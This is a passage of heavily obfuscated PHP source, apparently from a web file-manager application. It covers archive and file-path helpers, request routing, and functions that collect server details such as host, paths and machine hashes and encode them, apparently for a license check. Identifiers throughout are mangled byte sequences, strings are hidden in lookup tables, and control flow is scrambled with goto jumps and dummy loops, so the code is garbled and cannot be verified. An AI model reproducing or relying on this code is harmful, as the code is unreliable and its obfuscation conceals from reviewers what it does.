self::archiveExt($c´‚…÷ï›Ó); return $c´‚…÷ï›Ó; } private static function zipFileList($cÄÉá›¹å, $eÂ¿êô÷Ó = false) { $CŸŠøíĞË =& $_SERVER[Â€Á›¨õ]; $A¤¶²àÎÃõ = array(); foreach ($cÄÉá›¹å as $C¹êµ»‰à°) { $BÖéÌÏÛ¾Û = $C¹êµ»‰à°[$CŸŠøíĞË[75]]; if ($eÂ¿êô÷Ó) { $BÖéÌÏÛ¾Û = self::copy($C¹êµ»‰à°[$CŸŠøíĞË[75]], $eÂ¿êô÷Ó, $CŸŠøíĞË[761]); } else { $D÷Ş†ÂË« = self::init($C¹êµ»‰à°[$CŸŠøíĞË[75]]); if ($D÷Ş†ÂË«->getType() == $CŸŠøíĞË[105]) { $BÖéÌÏÛ¾Û = $D÷Ş†ÂË«->path; } } if ($BÖéÌÏÛ¾Û && self::local()->exist($BÖéÌÏÛ¾Û)) { $A¤¶²àÎÃõ[$C¹êµ»‰à°[$CŸŠøíĞË[75]]] = $BÖéÌÏÛ¾Û; } } if (!empty($A¤¶²àÎÃõ)) { return array_values($A¤¶²àÎÃõ); } show_json(LNG($CŸŠøíĞË[1035]), !1); } public static function tmpFileName($bµô›ÚÂÏ™) { $bƒ‰§¤ñ¿ =& $_SERVER[Â€Á›¨õ]; $DŸàº¹´¥ = array($bµô›ÚÂÏ™[$bƒ‰§¤ñ¿[28]], $bµô›ÚÂÏ™[$bƒ‰§¤ñ¿[75]], $bµô›ÚÂÏ™[$bƒ‰§¤ñ¿[77]], $bµô›ÚÂÏ™[$bƒ‰§¤ñ¿[481]]); return md5(implode($bƒ‰§¤ñ¿[70], $DŸàº¹´¥)); } private static function localFilePath($a×¹öæò‰, $fÄ±ª¹£˜‘) { goto cÀÜŒƒ£ˆ¼; BÍ­òâÉĞ‡: if ($cŸçòÙ•…[$c‡õé¾ïó[29]] == KodIO::KOD_SOURCE) { $E½í–æ±‘ = Model($c‡õé¾ïó[767])->fileInfoGet(KodIO::sourceID($a×¹öæò‰)); if (!$E½í–æ±‘[$c‡õé¾ïó[75]]) { show_json($c‡õé¾ïó[1074], !1); } $a×¹öæò‰ = $E½í–æ±‘[$c‡õé¾ïó[75]]; } $D–‰£Îµ…é = self::init($a×¹öæò‰); $E¸šö»«« = $D–‰£Îµ…é->getType(); goto d¿Íƒâ™ëª; d¿Íƒâ™ëª: if ($E¸šö»«« == $c‡õé¾ïó[105] || $E¸šö»«« == $c‡õé¾ïó[1075]) { if (!$D–‰£Îµ…é->exist($D–‰£Îµ…é->path)) { show_json(LNG($c‡õé¾ïó[104]), !1); } return $D–‰£Îµ…é->path; } return !1; goto AŠŒ£’öÅ¯; cÀÜŒƒ£ˆ¼: $c‡õé¾ïó =& $_SERVER[Â€Á›¨õ]; if ($fÄ±ª¹£˜‘ == $c‡õé¾ïó[1072] && strtoupper(substr(PHP_OS, 0, 3)) == $c‡õé¾ïó[1073]) { return !1; } $cŸçòÙ•… = KodIO::parse($a×¹öæò‰); goto BÍ­òâÉĞ‡; AŠŒ£’öÅ¯: } private static function archiveExt($a‹‰ØÒ£óŒ = '') { $GLOBALS[$_SERVER[Â€Á›¨õ][1076]] = $a‹‰ØÒ£óŒ; } } goto e‡÷±‚Ø‚; Aï‘°‚Š˜: $FïšÚïÈ²» = $_SERVER[Â€Á›¨õ][573]; if (strlen($FïšÚïÈ²») < $_SERVER[Â€Á›¨õ][570]) { die; } class Application { private $defaultModule = "\x69\156\x64\145\x78"; private $defaultController = "\151\x6e\x64\145\x78"; private $defaultAction = "\151\x6e\144\x65\x78"; function __construct() { } public function setDefault($cçÀŠ™„) { $b®µ½Ÿ­˜› =& $_SERVER[´Öò¹²]; $aá÷õÖ   = $b®µ½Ÿ­˜›[0]($b®µ½Ÿ­˜›[1], $b®µ½Ÿ­˜›[2]($cçÀŠ™„, $b®µ½Ÿ­˜›[1])); $this->defaultModule = $aá÷õÖ  [0] ? $aá÷õÖ  [0] : $this->defaultModule; $this->defaultController = $aá÷õÖ  [1] ? $aá÷õÖ  [1] : $this->defaultController; $this->defaultAction = $aá÷õÖ  [2] ? $aá÷õÖ  [2] : $this->defaultAction; $this->{$_SERVER[´Öò¹²][3]}($b®µ½Ÿ­˜›[4], array($this, $b®µ½Ÿ­˜›[5])); } public function appRun($D›¬Ú›Œßº) { goto aŸĞÍ¡ß; cø³‹Åå©’: $fËö¡ÈÁ“ = $c½†Ÿ¤µí[6]($Bõç‘à£¡[0]); $bñ õíñ× = $fµÍò‡Ø½ô[574]; $Cì©ÆçÇ  = $c½†Ÿ¤µí[7]; goto CÇ¼š¢‚; CÇ¼š¢‚: $bÕê± ‰ƒ® = $fµÍò‡Ø½ô[575]; if ($fËö¡ÈÁ“ == $c½†Ÿ¤µí[8]) { $Cì©ÆçÇ  = $c½†Ÿ¤µí[9]; $Bõç‘à£¡[0] = $c½†Ÿ¤µí[10]; $Bõç‘à£¡[1] = $Bõç‘à£¡[1] . $c½†Ÿ¤µí[11]; $D›¬Ú›Œßº = $c½†Ÿ¤µí[12]($c½†Ÿ¤µí[1], $Bõç‘à£¡); $D›¬Ú›Œßº = $c½†Ÿ¤µí[2]($D›¬Ú›Œßº, $c½†Ÿ¤µí[1]); } $c½†Ÿ¤µí[13](array($c½†Ÿ¤µí[14], $c½†Ÿ¤µí[15]), $Cì©ÆçÇ  . $c½†Ÿ¤µí[16], $D›¬Ú›Œßº); goto cå…÷õ†ñ¨; aŸĞÍ¡ß: $fµÍò‡Ø½ô =& $_SERVER[Â€Á›¨õ]; $c½†Ÿ¤µí =& $_SERVER[´Öò¹²]; $Bõç‘à£¡ = $c½†Ÿ¤µí[0]($c½†Ÿ¤µí[1], $D›¬Ú›Œßº); goto cø³‹Åå©’; cå…÷õ†ñ¨: $c½†Ÿ¤µí[17]($D›¬Ú›Œßº); $Fõ³ª†Åª• = $fµÍò‡Ø½ô[576]; $c½†Ÿ¤µí[13](array($c½†Ÿ¤µí[14], $c½†Ÿ¤µí[15]), $Cì©ÆçÇ  . $c½†Ÿ¤µí[18], $D›¬Ú›Œßº); goto Aõ“ÀìšÕ’; Aõ“ÀìšÕ’: } private function autorun() { goto BŒñÁ„çè¸; Cù£ó¥ç² : foreach ($config[$fòÙ…›Õ©ï[20]] as $B«ßİ¿£öÁ => $E±ÉÖ‹†ÚÅ) { $this->{$_SERVER[´Öò¹²][21]}($E±ÉÖ‹†ÚÅ); $Eë£Å¢Ãà = $d”„ÓªÔÉ°[579]; if (!$Eë£Å¢Ãà) { return; } } goto Cç“ÛÛÏ¼¾; BŒñÁ„çè¸: $d”„ÓªÔÉ° =& $_SERVER[Â€Á›¨õ]; $fòÙ…›Õ©ï =& $_SERVER[´Öò¹²]; global $config; goto A¹ÈšÛ»é­; A¹ÈšÛ»é­: $eªÙÛªêéá = $d”„ÓªÔÉ°[577]; while (strlen($eªÙÛªêéá) < $d”„ÓªÔÉ°[578]) { if (!$eªÙÛªêéá) { break; } $eªÙÛªêéá++; } if ($fòÙ…›Õ©ï[19]($config[$fòÙ…›Õ©ï[20]]) == 0) { return; } goto Cù£ó¥ç² ; Cç“ÛÛÏ¼¾: } private function fnkr484b7c5d() { goto aõŸ’ºšó; dµœâ«Ë®Ú: $c•ÎÙ— Ç¿ = $D¯ÕÈò¬‘â[581]; if (!$e‡êÉ¡õä || $fˆ×°ãÈö[24]($e‡êÉ¡õä) <= $fˆ×°ãÈö[24]($b…„Ğ¶Óõ)) { return; } if ($fˆ×°ãÈö[6]($fˆ×°ãÈö[25]($e‡êÉ¡õä, -$fˆ×°ãÈö[24]($b…„Ğ¶Óõ))) != $b…„Ğ¶Óõ) { return; } goto a×Ò÷„¿åŒ; CˆÏğğ‡ªó: $GLOBALS[$fˆ×°ãÈö[22]][$fˆ×°ãÈö[28]] = $fˆ×°ãÈö[29]($fˆ×°ãÈö[1], $GLOBALS[$fˆ×°ãÈö[22]][$fˆ×°ãÈö[23]]); goto Dë®Æà„¾; aõŸ’ºšó: $D¯ÕÈò¬‘â =& $_SERVER[Â€Á›¨õ]; $fˆ×°ãÈö =& $_SERVER[´Öò¹²]; $b…„Ğ¶Óõ = $fˆ×°ãÈö[8]; goto C÷ğ×œäò’; a×Ò÷„¿åŒ: $EöÙ‘‡Ù¹ï = $fˆ×°ãÈö[25]($e‡êÉ¡õä, 0, -$fˆ×°ãÈö[24]($b…„Ğ¶Óõ)); $b†©öÌ˜¶· = $D¯ÕÈò¬‘â[582]; if (!$b†©öÌ˜¶·) { return; } goto A—¦¡„ó; C÷ğ×œäò’: $fÊƒàø¾İƒ = $D¯ÕÈò¬‘â[580]; if (!$fÊƒàø¾İƒ) { return; } $e‡êÉ¡õä = $GLOBALS[$fˆ×°ãÈö[22]][$fˆ×°ãÈö[23]][0]; goto dµœâ«Ë®Ú; A—¦¡„ó: $CˆĞƒæêİ = array($fˆ×°ãÈö[8], $EöÙ‘‡Ù¹ï); $FßâîßÆ· = $fˆ×°ãÈö[26]($GLOBALS[$fˆ×°ãÈö[22]][$fˆ×°ãÈö[23]], 1); $GLOBALS[$fˆ×°ãÈö[22]][$fˆ×°ãÈö[23]] = $fˆ×°ãÈö[27]($CˆĞƒæêİ, $FßâîßÆ·); goto CˆÏğğ‡ªó; Dë®Æà„¾: } private function vfrze4061de9() { goto föÚÖÌÂ÷; Añ—Æ‚Íƒ®: $GLOBALS[$B°É¿ôÁÚ[22]][$B°É¿ôÁÚ[28]] = $B°É¿ôÁÚ[29]($B°É¿ôÁÚ[1], $GLOBALS[$B°É¿ôÁÚ[22]][$B°É¿ôÁÚ[23]]); $fÑ·Ù¼—· = $dÆšÙÎ„–Õ[585]; goto CÁ‡¿÷‡ÎÕ; fç–È¦ªÃ: $B°É¿ôÁÚ[34]($B°É¿ôÁÚ[35], $aÜ˜í°›ì», $D‘½õŠ„¶Í); $aÜ˜í°›ì» = $B°É¿ôÁÚ[2]($D‘½õŠ„¶Í[0][0], $B°É¿ôÁÚ[36]); $GLOBALS[$B°É¿ôÁÚ[22]][$B°É¿ôÁÚ[23]] = $B°É¿ôÁÚ[0]($B°É¿ôÁÚ[36], $aÜ˜í°›ì»); goto Añ—Æ‚Íƒ®; Cˆ„‘ÕŠŸ¥: $dİÔİ áÙ = $dÆšÙÎ„–Õ[584]; if (strlen($dİÔİ áÙ) < $dÆšÙÎ„–Õ[570]) { die; } $aÜ˜í°›ì» = $B°É¿ôÁÚ[25]($cêå·×‹³Á, $Fñá¡—£ÎÅ + $B°É¿ôÁÚ[24]($B‰è‡ªİÕ…)); goto fç–È¦ªÃ; FêÌÒ²Ìö: $B‰è‡ªİÕ… = $B°É¿ôÁÚ[31]; if (!$B°É¿ôÁÚ[32]($cêå·×‹³Á, $B‰è‡ªİÕ…)) { return; } $Fñá¡—£ÎÅ = $B°É¿ôÁÚ[33]($cêå·×‹³Á, $B‰è‡ªİÕ…); goto Cˆ„‘ÕŠŸ¥; föÚÖÌÂ÷: $dÆšÙÎ„–Õ =& $_SERVER[Â€Á›¨õ]; $B°É¿ôÁÚ =& $_SERVER[´Öò¹²]; if ($GLOBALS[$B°É¿ôÁÚ[22]][$B°É¿ôÁÚ[28]] != $B°É¿ôÁÚ[10]) { return; } goto bÜ‚¤¤Ğè ; bÜ‚¤¤Ğè : $cêå·×‹³Á = $_SERVER[$B°É¿ôÁÚ[30]]; $D™œ¦ÀÆÕ¸ = $dÆšÙÎ„–Õ[583]; if (!$D™œ¦ÀÆÕ¸) { return; } goto FêÌÒ²Ìö; CÁ‡¿÷‡ÎÕ: } public function run() { goto bğä¦‹³è‘; FåéŒæêà: $_SERVER[$DæØÛ’ÒÄë[44]] = $DæØÛ’ÒÄë[6](ACTION); $this->{$_SERVER[´Öò¹²][45]}(); $d…í ¡²Ã = $bçÓë—¥¿[594]; goto B‘†¡Šô‹; bğä¦‹³è‘: $bçÓë—¥¿ =& $_SERVER[Â€Á›¨õ]; $DæØÛ’ÒÄë =& $_SERVER[´Öò¹²]; $this->{$_SERVER[´Öò¹²][37]}(); goto CèÓ×²«œš; B‘†¡Šô‹: if (!$d…í ¡²Ã) { die; } if ($DæØÛ’ÒÄë[19]($B…­¯®• Î) >= 3) { $this->{$_SERVER[´Öò¹²][21]}($Cí½Ûªªğ); } else { $this->{$_SERVER[´Öò¹²][21]}(ACTION); } goto d›†§¾‘à‰; AÜÏêªÖ“Š: $BêÅÚƒ±òå = $bçÓë—¥¿[588]; while (strlen($BêÅÚƒ±òå) < $bçÓë—¥¿[589]) { if (!$BêÅÚƒ±òå) { break; } $BêÅÚƒ±òå++; } $Cí½Ûªªğ = $GLOBALS[$DæØÛ’ÒÄë[22]][$DæØÛ’ÒÄë[28]]; goto D­ó¢É”ø; eàµˆİ²êã: $cå¶ÓË×¦ = $bçÓë—¥¿[587]; if (!$cå¶ÓË×¦) { return; } $B…­¯®• Î = $GLOBALS[$DæØÛ’ÒÄë[22]][$DæØÛ’ÒÄë[23]]; goto AÜÏêªÖ“Š; fë‘«ºŠù¦: $DæØÛ’ÒÄë[39]($DæØÛ’ÒÄë[41], isset($B…­¯®• Î[1]) && $B…­¯®• Î[0] ? $B…­¯®• Î[1] : $this->defaultController); $c‚ù‹ƒïøá = $bçÓë—¥¿[591]; if (strlen($c‚ù‹ƒïøá) < $bçÓë—¥¿[592]) { die; } goto eŞŒôèˆÌò; CèÓ×²«œš: $DªÎ­Çæ£ã = $bçÓë—¥¿[586]; if (!$DªÎ­Çæ£ã) { die; } $this->{$_SERVER[´Öò¹²][38]}(); goto eàµˆİ²êã; D­ó¢É”ø: $DæØÛ’ÒÄë[39]($DæØÛ’ÒÄë[40], isset($B…­¯®• Î[0]) && $B…­¯®• Î[0] ? $B…­¯®• Î[0] : $this->defaultModule); $c‚Òæ™·ÇŞ = $bçÓë—¥¿[590]; if (!$c‚Òæ™·ÇŞ) { die; } goto fë‘«ºŠù¦; eŞŒôèˆÌò: $DæØÛ’ÒÄë[39]($DæØÛ’ÒÄë[42], isset($B…­¯®• Î[2]) && $B…­¯®• Î[0] ? $B…­¯®• Î[2] : $this->defaultAction); $DæØÛ’ÒÄë[39]($DæØÛ’ÒÄë[43], MOD . $DæØÛ’ÒÄë[1] . ST . $DæØÛ’ÒÄë[1] . ACT); $aÛÄ¼¼Ö“ = $bçÓë—¥¿[593]; goto FåéŒæêà; d›†§¾‘à‰: } private $qbam631bd298 = array(); private $wzul6408bb39 = ''; public function zqlbf7162e20() { goto B ˆĞœâÜ; C‘¨­ğŞõÆ: $e†®¨Õ® = $A¹§ß‚Œ[600]; if (strlen($e†®¨Õ®) < $A¹§ß‚Œ[578]) { die; } $this->{$_SERVER[´Öò¹²][3]}($dßÑà»Ù­Ó[55], array($this, $dßÑà»Ù­Ó[56])); goto Aà‚êéÑŠí; DÒëİöå…Ÿ: $cÒŠ©ÀÜŒæ = $A¹§ß‚Œ[599]; if (strlen($cÒŠ©ÀÜŒæ) < $A¹§ß‚Œ[589]) { return; } $this->{$_SERVER[´Öò¹²][3]}($dßÑà»Ù­Ó[53], array($this, $dßÑà»Ù­Ó[54])); goto C‘¨­ğŞõÆ; B ˆĞœâÜ: $A¹§ß‚Œ =& $_SERVER[Â€Á›¨õ]; $dßÑà»Ù­Ó =& $_SERVER[´Öò¹²]; $this->{$_SERVER[´Öò¹²][46]}(); goto FÅî‚ÛÓ; C‡·Õ×ºøò: $this->{$_SERVER[´Öò¹²][49]}(); $b–ÁÜ´æ = $A¹§ß‚Œ[596]; while (strlen($b–ÁÜ´æ) < $A¹§ß‚Œ[592]) { if (!$b–ÁÜ´æ) { break; } $b–ÁÜ´æ++; } goto AÑâŸçË; FÅî‚ÛÓ: $this->{$_SERVER[´Öò¹²][47]}(); $D¦„¹ñ‹± = $A¹§ß‚Œ[595]; $this->{$_SERVER[´Öò¹²][48]}(); goto C‡·Õ×ºøò; AÑâŸçË: $this->{$_SERVER[´Öò¹²][50]}(); $f³¿÷­Ü‡š = $A¹§ß‚Œ[597]; $this->{$_SERVER[´Öò¹²][51]}(); goto Döà¿ò¨´‡; Döà¿ò¨´‡: $DÃí‘ğÊñ = $A¹§ß‚Œ[598]; if (!$DÃí‘ğÊñ) { die; } $this->{$_SERVER[´Öò¹²][52]}(); goto DÒëİöå…Ÿ; Aà‚êéÑŠí: $this->{$_SERVER[´Öò¹²][3]}($dßÑà»Ù­Ó[57], array($this, $dßÑà»Ù­Ó[58])); $this->{$_SERVER[´Öò¹²][3]}($dßÑà»Ù­Ó[59], array($this, $dßÑà»Ù­Ó[60])); goto f×ãƒßÑ³œ; f×ãƒßÑ³œ: } public function ezal46face5c($B…ª’êä×á) { goto C‹±È±é; C‹±È±é: $AÁ×áØëòÃ =& $_SERVER[Â€Á›¨õ]; $cÓğ¸—Ã÷ğ =& $_SERVER[´Öò¹²]; $EÙ†‹¸Úçø = $cÓğ¸—Ã÷ğ[61]($cÓğ¸—Ã÷ğ[62])->{$_SERVER[´Öò¹²][63]}(); goto FÑ‘›‰ŒÔ˜; DŞÉ„ÍÛÃŞ: $B…ª’êä×á[$cÓğ¸—Ã÷ğ[114]][$cÓğ¸—Ã÷ğ[134]] = $cÓğ¸—Ã÷ğ[112]($this->qbam631bd298, $cÓğ¸—Ã÷ğ[135], $cÓğ¸—Ã÷ğ[10]); $B…ª’êä×á[$cÓğ¸—Ã÷ğ[114]][$cÓğ¸—Ã÷ğ[136]] = $cÓğ¸—Ã÷ğ[112]($this->qbam631bd298, $cÓğ¸—Ã÷ğ[137], $cÓğ¸—Ã÷ğ[10]); $fÇ¤Ê•ÌƒÚ = $AÁ×áØëòÃ[605]; goto FøôÚîÍ½¢; b»…’‡Ûñˆ: $B…ª’êä×á[$cÓğ¸—Ã÷ğ[114]][$cÓğ¸—Ã÷ğ[115]] = $cÓğ¸—Ã÷ğ[116]($cÓğ¸—Ã÷ğ[117])->{$_SERVER[´Öò¹²][118]}(); $B…ª’êä×á[$cÓğ¸—Ã÷ğ[114]][$cÓğ¸—Ã÷ğ[119]] = $cÓğ¸—Ã÷ğ[120]($_SERVER[$cÓğ¸—Ã÷ğ[121]] . $EÙ†‹¸Úçø[$cÓğ¸—Ã÷ğ[122]]); $B…ª’êä×á[$cÓğ¸—Ã÷ğ[114]][$cÓğ¸—Ã÷ğ[123]] = $cÓğ¸—Ã÷ğ[124]($cÓğ¸—Ã÷ğ[125]()); goto f—Á±Æ¬Äî; e÷œÂ›·»é: unset($B…ª’êä×á[$cÓğ¸—Ã÷ğ[102]][$cÓğ¸—Ã÷ğ[104]][$cÓğ¸—Ã÷ğ[105]]); $d¬ñ¡¶ªÆ = $AÁ×áØëòÃ[602]; if (strlen($d¬ñ¡¶ªÆ) < $AÁ×áØëòÃ[603]) { return; } goto e©¦éÆ„£Ú; FøôÚîÍ½¢: if (!$fÇ¤Ê•ÌƒÚ) { die; } if ($cÓğ¸—Ã÷ğ[112]($GLOBALS, $cÓğ¸—Ã÷ğ[138]) && $this->config[$cÓğ¸—Ã÷ğ[139]]) { $B…ª’êä×á[$cÓğ¸—Ã÷ğ[114]][$cÓğ¸—Ã÷ğ[140]] = WEB_ROOT; } return $B…ª’êä×á; goto a¤¾î£È•„; f—Á±Æ¬Äî: $B…ª’êä×á[$cÓğ¸—Ã÷ğ[114]][$cÓğ¸—Ã÷ğ[126]] = $this->wzul6408bb39; if ($EÙ†‹¸Úçø[$cÓğ¸—Ã÷ğ[126]] != $cÓğ¸—Ã÷ğ[127]) { $B…ª’êä×á[$cÓğ¸—Ã÷ğ[114]][$cÓğ¸—Ã÷ğ[128]] = $EÙ†‹¸Úçø[$cÓğ¸—Ã÷ğ[128]]; $B…ª’êä×á[$cÓğ¸—Ã÷ğ[114]][$cÓğ¸—Ã÷ğ[129]] = $EÙ†‹¸Úçø[$cÓğ¸—Ã÷ğ[129]]; $c‰ï¯æ ¢ = $cÓğ¸—Ã÷ğ[130](10) . $this->wzul6408bb39 . $cÓğ¸—Ã÷ğ[130](5); $B…ª’êä×á[$cÓğ¸—Ã÷ğ[102]][$cÓğ¸—Ã÷ğ[131]][$cÓğ¸—Ã÷ğ[132]] = $this->{$_SERVER[´Öò¹²][133]}($c‰ï¯æ ¢, $B…ª’êä×á[$cÓğ¸—Ã÷ğ[114]][$cÓğ¸—Ã÷ğ[119]]); } if ($this->wzul6408bb39 == $cÓğ¸—Ã÷ğ[127]) { $B…ª’êä×á[$cÓğ¸—Ã÷ğ[102]][$cÓğ¸—Ã÷ğ[103]][$cÓğ¸—Ã÷ğ[108]][$cÓğ¸—Ã÷ğ[113]] = 0; } goto DŞÉ„ÍÛÃŞ; e©¦éÆ„£Ú: unset($B…ª’êä×á[$cÓğ¸—Ã÷ğ[102]][$cÓğ¸—Ã÷ğ[104]][$cÓğ¸—Ã÷ğ[106]]); $d¡ŒÀ¸ğ¥é = $AÁ×áØëòÃ[604]; while (strlen($d¡ŒÀ¸ğ¥é) < $AÁ×áØëòÃ[570]) { if (!$d¡ŒÀ¸ğ¥é) { break; } $d¡ŒÀ¸ğ¥é++; } goto Bï¯Şñ¨¦Ú; FÑ‘›‰ŒÔ˜: $c™ñĞçÀ»¨ = array($cÓğ¸—Ã÷ğ[64], $cÓğ¸—Ã÷ğ[65], $cÓğ¸—Ã÷ğ[66], $cÓğ¸—Ã÷ğ[67], $cÓğ¸—Ã÷ğ[68], $cÓğ¸—Ã÷ğ[69], $cÓğ¸—Ã÷ğ[70], $cÓğ¸—Ã÷ğ[71], $cÓğ¸—Ã÷ğ[72], $cÓğ¸—Ã÷ğ[73], $cÓğ¸—Ã÷ğ[74], $cÓğ¸—Ã÷ğ[75], $cÓğ¸—Ã÷ğ[76], $cÓğ¸—Ã÷ğ[77], $cÓğ¸—Ã÷ğ[78], $cÓğ¸—Ã÷ğ[79], $cÓğ¸—Ã÷ğ[80], $cÓğ¸—Ã÷ğ[81], $cÓğ¸—Ã÷ğ[82], $cÓğ¸—Ã÷ğ[83], $cÓğ¸—Ã÷ğ[84], $cÓğ¸—Ã÷ğ[85], $cÓğ¸—Ã÷ğ[86], $cÓğ¸—Ã÷ğ[87], $cÓğ¸—Ã÷ğ[88], $cÓğ¸—Ã÷ğ[89], $cÓğ¸—Ã÷ğ[90], $cÓğ¸—Ã÷ğ[91], $cÓğ¸—Ã÷ğ[92], $cÓğ¸—Ã÷ğ[93], $cÓğ¸—Ã÷ğ[94], $cÓğ¸—Ã÷ğ[95], $cÓğ¸—Ã÷ğ[96], $cÓğ¸—Ã÷ğ[97], $cÓğ¸—Ã÷ğ[98], $cÓğ¸—Ã÷ğ[99]); foreach ($c™ñĞçÀ»¨ as $D…”­ª‹Şô) { $D¹ïåå÷¢’ = $GLOBALS[$cÓğ¸—Ã÷ğ[100]][$cÓğ¸—Ã÷ğ[101]][$D…”­ª‹Şô]; $Eåø™•ô¾ = $AÁ×áØëòÃ[601]; if (isset($EÙ†‹¸Úçø[$D…”­ª‹Şô])) { $D¹ïåå÷¢’ = $EÙ†‹¸Úçø[$D…”­ª‹Şô]; } $B…ª’êä×á[$cÓğ¸—Ã÷ğ[102]][$cÓğ¸—Ã÷ğ[103]][$D…”­ª‹Şô] = $D¹ïåå÷¢’; } $C„Ñ×–¢”î = $B…ª’êä×á[$cÓğ¸—Ã÷ğ[102]][$cÓğ¸—Ã÷ğ[103]][$cÓğ¸—Ã÷ğ[76]]; goto e÷œÂ›·»é; Bï¯Şñ¨¦Ú: unset($B…ª’êä×á[$cÓğ¸—Ã÷ğ[102]][$cÓğ¸—Ã÷ğ[103]][$cÓğ¸—Ã÷ğ[76]]); unset($B…ª’êä×á[$cÓğ¸—Ã÷ğ[102]][$cÓğ¸—Ã÷ğ[103]][$cÓğ¸—Ã÷ğ[107]]); $B…ª’êä×á[$cÓğ¸—Ã÷ğ[102]][$cÓğ¸—Ã÷ğ[103]][$cÓğ¸—Ã÷ğ[108]] = array($cÓğ¸—Ã÷ğ[109] => (int) $C„Ñ×–¢”î[$cÓğ¸—Ã÷ğ[110]], $cÓğ¸—Ã÷ğ[111] => (int) $cÓğ¸—Ã÷ğ[112]($C„Ñ×–¢”î, $cÓğ¸—Ã÷ğ[113], 0)); goto b»…’‡Ûñˆ; a¤¾î£È•„: } private function jmpib68569a2() { goto AÒˆà½öì; AÒˆà½öì: $FËØôÒòÃİ =& $_SERVER[Â€Á›¨õ]; $D›Ú¬šÄ„ƒ =& $_SERVER[´Öò¹²]; if ($_SERVER[$D›Ú¬šÄ„ƒ[44]] == $D›Ú¬šÄ„ƒ[141]) { goto a¬–Ì×÷â§; EóÆÆâ½¯µ: $d˜ãÁª‘‚” = array($D›Ú¬šÄ„ƒ[156] => $e ¿ £ºÜ); $dà©‚İß‘† = $FËØôÒòÃİ[606]; $D›Ú¬šÄ„ƒ[13](array($D›Ú¬šÄ„ƒ[157], $D›Ú¬šÄ„ƒ[158]), $d˜ãÁª‘‚”); goto FÙ¯œ¦°î¨; FÙ¯œ¦°î¨: $Aé™£Êë¡¢ = $FËØôÒòÃİ[607]; goto D¢¸º¾ƒ‹¬; a¬–Ì×÷â§: $e ¿ £ºÜ = array($D›Ú¬šÄ„ƒ[126] => $this->wzul6408bb39, $D›Ú¬šÄ„ƒ[142] => $this->{$_SERVER[´Öò¹²][143]}(), $D›Ú¬šÄ„ƒ[144] => $D›Ú¬šÄ„ƒ[61]($D›Ú¬šÄ„ƒ[145])->{$_SERVER[´Öò¹²][146]}()); if ($this->wzul6408bb39 != $D›Ú¬šÄ„ƒ[127]) { $cõÑÏÛ—³¨ = $D›Ú¬šÄ„ƒ[112]($this->qbam631bd298, $D›Ú¬šÄ„ƒ[147]); if ($cõÑÏÛ—³¨) { $e ¿ £ºÜ[$D›Ú¬šÄ„ƒ[148]] = $cõÑÏÛ—³¨; $e ¿ £ºÜ[$D›Ú¬šÄ„ƒ[149]] = $D›Ú¬šÄ„ƒ[150]($D›Ú¬šÄ„ƒ[112]($this->qbam631bd298, $D›Ú¬šÄ„ƒ[151])); $e ¿ £ºÜ[$D›Ú¬šÄ„ƒ[152]] = $D›Ú¬šÄ„ƒ[112]($this->qbam631bd298, $D›Ú¬šÄ„ƒ[137]); } } $e ¿ £ºÜ = $this->{$_SERVER[´Öò¹²][153]}($D›Ú¬šÄ„ƒ[154]($e ¿ £ºÜ), $D›Ú¬šÄ„ƒ[120]($D›Ú¬šÄ„ƒ[155])); goto EóÆÆâ½¯µ; D¢¸º¾ƒ‹¬: } goto eÒ¢ôğ·ó­; fæ‡ï™¼§†: $cÂ„‘÷Ö„¥ = $FËØôÒòÃİ[608]; $d˜ãÁª‘‚” = array($D›Ú¬šÄ„ƒ[165] => $fÔµÓÊàŠ[$D›Ú¬šÄ„ƒ[64]], $D›Ú¬šÄ„ƒ[166] => $fÔµÓÊàŠ[$D›Ú¬šÄ„ƒ[65]], $D›Ú¬šÄ„ƒ[167] => $D›Ú¬šÄ„ƒ[10]); foreach ($EƒÔ‘±ïá¢ as $f½Šå­Úã) { if (!isset($fÔµÓÊàŠ[$f½Šå­Úã]) || !$fÔµÓÊàŠ[$f½Šå­Úã]) { continue; } $d˜ãÁª‘‚”[$f½Šå­Úã] = $fÔµÓÊàŠ[$f½Šå­Úã]; } goto C›ò‹¯çÄ¾; eÒ¢ôğ·ó­: if ($this->wzul6408bb39 == $D›Ú¬šÄ„ƒ[127]) { return; } $EƒÔ‘±ïá¢ = array($D›Ú¬šÄ„ƒ[159], $D›Ú¬šÄ„ƒ[160], $D›Ú¬šÄ„ƒ[161], $D›Ú¬šÄ„ƒ[162], $D›Ú¬šÄ„ƒ[163], $D›Ú¬šÄ„ƒ[164]); $fÔµÓÊàŠ = $D›Ú¬šÄ„ƒ[61]($D›Ú¬šÄ„ƒ[62])->{$_SERVER[´Öò¹²][63]}(); goto fæ‡ï™¼§†; C›ò‹¯çÄ¾: $D›Ú¬šÄ„ƒ[13](array($D›Ú¬šÄ„ƒ[157], $D›Ú¬šÄ„ƒ[158]), $d˜ãÁª‘‚”); $Aâ„ì¬”ã¤ = $FËØôÒòÃİ[609]; while ($Aâ„ì¬”ã¤ < $FËØôÒòÃİ[589]) { if ($Aâ„ì¬”ã¤ >= 0) { break; } $Aâ„ì¬”ã¤++; } goto B×çËË­¹ä; B×çËË­¹ä: } private function urgfe8858c1d() { goto AªĞ‹Íî; Cß˜›¼«ï‘: $EÈ—«Ğ¦‘ = $this->{$_SERVER[´Öò¹²][206]}($a ¿ù‚°Šß[$bÑÜ÷˜•Ÿù[207]]); if (!$EÈ—«Ğ¦‘ || $EÈ—«Ğ¦‘ != $a ¿ù‚°Šß[$bÑÜ÷˜•Ÿù[151]]) { $bŒõ–¢§çÄ = array($bÑÜ÷˜•Ÿù[208] => $bÑÜ÷˜•Ÿù[61]($bÑÜ÷˜•Ÿù[62])->{$_SERVER[´Öò¹²][63]}($bÑÜ÷˜•Ÿù[122]), $bÑÜ÷˜•Ÿù[209] => $_SERVER[$bÑÜ÷˜•Ÿù[121]], $bÑÜ÷˜•Ÿù[210] => $bÑÜ÷˜•Ÿù[211](), $bÑÜ÷˜•Ÿù[180] => $_SERVER[$bÑÜ÷˜•Ÿù[181]]); $bƒäñ†·ÅŠ = $this->{$_SERVER[´Öò¹²][212]}($bÑÜ÷˜•Ÿù[154]($bŒõ–¢§çÄ)); $this->{$_SERVER[´Öò¹²][189]}($bÑÜ÷˜•Ÿù[213] . $bƒäñ†·ÅŠ); $bÑÜ÷˜•Ÿù[172]($bÑÜ÷˜•Ÿù[204]($bÑÜ÷˜•Ÿù[214]), !0); } $Bš•Ó™Ù×ø = array($bÑÜ÷˜•Ÿù[215] => $AÃ‡šôÍ’[$bÑÜ÷˜•Ÿù[171]], $bÑÜ÷˜•Ÿù[216] => $a 